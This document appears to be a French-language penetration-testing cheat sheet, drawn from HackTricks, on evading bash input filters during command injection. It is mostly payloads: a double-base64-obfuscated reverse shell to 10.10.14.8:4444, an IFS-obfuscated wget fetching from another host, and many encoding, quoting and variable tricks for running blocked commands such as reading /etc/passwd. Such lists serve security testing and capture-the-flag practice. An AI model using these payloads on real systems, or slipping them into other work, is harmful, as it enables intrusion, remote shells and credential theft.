Contournement des restrictions d'entrées utilisateurs.
# bash 
https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions 
## Caractère de substitution de nouvelles commandes
- ;
- |
- $()
- &&

## Double-Base64 
```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
Résultat:
echo\WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

## Bypass Paths and forbidden words

### Question mark binary substitution
```bash
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
```

### Concatenation
```bash
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
\u\n\a\m\e \-\a # uname -a
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64
/\b\i\n/////s\h
```

### Execution through $0
```bash
echo whoami|$0
```

### Uninitialized variables: A uninitialized variable equals to null (nothing)
```bash
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
```


### Fake commands
```bash
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown
```



### Concatenation of strings using history
```bash
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```


### -- peut permettre d'ignorer les options placées après

## Contournement de restriction sur les espaces
### {form}
```bash
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test
```


# Put the command line in a variable and then execute it
```bash
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
```

#  Other way, just change each space for ${IFS}
```bash
echo${IFS}test
```


# Using hex format
```bash
X=$'cat\x20/etc/passwd'&&$X
```


# New lines
```bash
p\
i\
n\
g # These 4 lines will equal to ping
```


# Undefined variables and !
```bash
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```


## Contournerment backslash et slash

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```


## Bypass with hex encoding
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```


## Contournement restriction ip
```text
Decimal IPs
127.0.0.1 == 2130706433
```


## Plus d'info sur la page hacktricks 

